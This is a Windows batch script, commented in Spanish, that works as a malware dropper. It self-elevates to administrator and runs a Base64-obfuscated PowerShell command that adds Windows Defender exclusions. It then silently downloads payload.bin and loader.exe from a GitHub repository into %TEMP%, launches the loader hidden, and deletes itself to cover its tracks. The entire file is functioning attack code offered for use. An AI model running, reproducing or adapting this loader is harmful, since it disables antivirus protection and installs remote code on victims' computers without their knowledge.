@echo off
:: Autoelevación a administrador
net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

:: Crear carpeta loader en %TEMP%
if not exist "%TEMP%\loader" mkdir "%TEMP%\loader"

:: 1. Exclusión ofuscada (Base64 Unicode)
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX ([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARQB4AGMAbAB1AHMAaQBvAG4AUAByAG8AYwBlAHMAcwAgACcAbgBvAHQAZQBwAGEAZAAuAGUAeABlACcALAAgACcAdwBpAG4AZABvAHcAcwAtAGMAbABhAGMAawAuAGUAeABlACcA')))"

:: 2. Esperar 6 segundos para que la exclusión se aplique
timeout /t 6 /nobreak >nul 2>&1

:: 3. Descargar payload.bin
curl -L -o "%TEMP%\loader\payload.bin" "https://raw.githubusercontent.com/carlospro473/Chac/main/payload.bin" >nul 2>&1

:: 4. Esperar 6 segundos antes de la siguiente descarga
timeout /t 6 /nobreak >nul 2>&1

:: 5. Descargar loader.exe
curl -L -o "%TEMP%\loader\loader.exe" "https://raw.githubusercontent.com/carlospro473/Chac/main/loader.exe" >nul 2>&1

:: 6. Ejecutar loader.exe en segundo plano, oculto, sin ventana (usando start /b)
if exist "%TEMP%\loader\loader.exe" (
    start /b "" "%TEMP%\loader\loader.exe" >nul 2>&1
)

:: 7. Autoborrado del .bat (espera 15 segundos y elimina)
start /b powershell -Command "Start-Sleep -Seconds 15; Remove-Item -Path '%~f0' -Force"

exit
